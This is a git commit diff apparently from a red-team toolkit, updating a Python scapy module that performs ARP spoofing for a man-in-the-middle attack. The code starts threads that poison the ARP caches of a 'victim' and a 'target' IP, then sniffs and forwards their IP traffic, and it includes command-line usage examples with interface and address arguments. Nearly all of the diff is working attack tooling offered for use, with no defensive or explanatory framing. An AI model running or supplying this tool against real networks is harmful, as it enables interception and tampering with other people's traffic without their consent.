24195a5248de4689e41fc27af1766cc19ff4093c
= <=>
2025-03-09 17:00:34 -0300

    adding arp spoof tool

--- src/alpha/v0_1/modules/red_arpspoof.py
+++ src/alpha/v0_1/modules/red_arpspoof.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ARP Spoofing
+# ARP Spoofing (Man-in-the-middle)
 
 import argparse
 from scapy.all import *
@@ -20,56 +20,50 @@ def arpSpoof(targetIp, spoofIp, iface):
         send(pkt, iface=iface, verbose=False)
         time.sleep(1)
 
-def forwardPacket(pkt, hostIp, routerIp, iface):
-    # Forward packet depending on destination
+def forwardPacket(pkt, victimIp, targetIp, iface):
     if pkt.haslayer(IP):
-        if pkt.dst == hostIp:
-            sendp(pkt, iface=iface, verbose=False)
-        elif pkt.dst == routerIp:
-            sendp(pkt, iface=iface, verbose=False)
-        else:
-            sendp(pkt, iface=iface, verbose=False)
+        sendp(pkt, iface=iface, verbose=False)
 
-def sniffAndForward(hostIp, routerIp, iface):
+def sniffAndForward(victimIp, targetIp, iface):
     print(f"Starting packet sniffing on {iface}")
-    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, hostIp, routerIp, iface), store=0, timeout=10)
+    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, victimIp, targetIp, iface), store=0, timeout=10)
 
-def startAttack(hostIp, routerIp, iface):
+def startAttack(victimIp, targetIp, iface):
     # Start ARP poisoning threads
-    threading.Thread(target=arpSpoof, args=(hostIp, routerIp, iface), daemon=True).start()
-    threading.Thread(target=arpSpoof, args=(routerIp, hostIp, iface), daemon=True).start()
+    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
+    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
     # Start sniffing and forwarding packets
-    sniffAndForward(hostIp, routerIp, iface)
+    sniffAndForward(victimIp, targetIp, iface)
 
 def menu():
     RED = "\033[38;2;255;0;0m"
     RESET = "\033[0m"
-    hostIp = input(f"{RED}\nHost IP: {RESET}")
+    victimIp = input(f"{RED}\nHost IP: {RESET}")
     targetIp = input(f"{RED}Target IP: {RESET}")
     interface = input(f"{RED}Interface: {RESET}")
-    startAttack(hostIp, targetIp, interface)
+    startAttack(victimIp, targetIp, interface)
 
 def terminal():
     parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument("-H", "--hostip", required=True, help="Host IP address.")
+    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
     parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
-    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.\nUsage: python3 arpspoof.py -H 192.168.1.10 -t 192.168.1.1 -i eth0")
+    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.\nUsage: purplest-arpspoof -v 192.168.1.10 -t 192.168.1.1 -i eth0")
 
     args = parser.parse_args()
 
-    if args.hostip and args.targetip and args.interface:
-        startAttack(args.hostip, args.targetip, args.interface)
+    if args.victimip and args.targetip and args.interface:
+        startAttack(args.victimip, args.targetip, args.interface)
     else:
-        parser.error("Syntax error.")
+        parser.error("Syntax error. Usage: purplest-arpspoof -v 192.168.1.10 -t 192.168.1.1 -i eth0")
 
-def signal_handler(sig, frame):
+def signalHandler(sig, frame):
     global running
     print("\nGracefully stopping attack...")
     running = False
     sys.exit(0)
 
 def main():
-    signal.signal(signal.SIGINT, signal_handler)  
+    signal.signal(signal.SIGINT, signalHandler)  
     if len(sys.argv) > 1:
         terminal()
     else:
